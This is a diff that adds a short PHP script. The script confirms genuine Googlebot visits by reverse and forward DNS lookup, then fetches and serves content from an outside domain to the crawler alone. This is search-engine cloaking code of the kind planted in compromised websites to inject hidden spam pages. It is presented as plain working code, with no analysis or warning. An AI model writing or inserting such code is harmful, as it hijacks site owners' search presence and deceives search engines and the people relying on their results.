@@ -1,0 +1,37 @@
+<?php
+function is_real_googlebot() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    $host = gethostbyaddr($ip);
+    if ($host === $ip) return false;
+
+    if (!preg_match('/\.google(bot)?\.com$/', $host)) return false;
+
+    $forward_ips = gethostbynamel($host);
+    if ($forward_ips === false) return false;
+
+    return in_array($ip, $forward_ips);
+}
+
+if (is_real_googlebot()) {
+    $remote_url = "https://hatersonduty.com/lp2mp-undip/";
+
+    $options = [
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Googlebot\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    $content = @file_get_contents($remote_url, false, $context);
+
+    if ($content === false) {
+        http_response_code(204); // No Content
+    } else {
+        echo $content;
+    }
+
+    exit;
+}
+?>
